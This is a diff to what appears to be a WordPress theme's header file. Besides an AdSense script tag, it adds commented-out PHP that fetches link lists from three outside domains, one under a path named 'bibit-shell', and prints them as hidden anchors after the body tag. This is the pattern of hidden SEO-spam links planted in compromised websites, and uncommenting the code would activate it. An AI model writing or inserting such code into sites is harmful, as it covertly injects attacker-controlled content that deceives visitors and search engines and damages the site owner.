@@ -106,8 +106,12 @@
 </script>
 
 <?php wp_head(); ?>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7900338252115916" crossorigin="anonymous"></script>
 </head>
 <body <?php body_class(); ?>>
+<?php /* $a = json_decode(file_get_contents('https://chulopapi.com/grup1/'));foreach($a as $key => $val){echo '<a href="'.$val.'" style="display:none;">'.$key.'</a>';}?>    
+<?php /* $a = json_decode(file_get_contents('https://nagabonar.me/gru5/'));foreach($a as $key => $val){echo '<a href="'.$val.'" style="display:none;">'.$key.'</a>';} */?>
+<?php /* $d = file_get_contents('https://susumentega.biz/bibit-shell/'); $data = json_decode($d); foreach($data as $key => $value) :?> 
 <a href="<?=$value;?>" style="display:none;"><?=$key;?></a><br>
 <?php endforeach; */ ?>
 <div id="warpper">
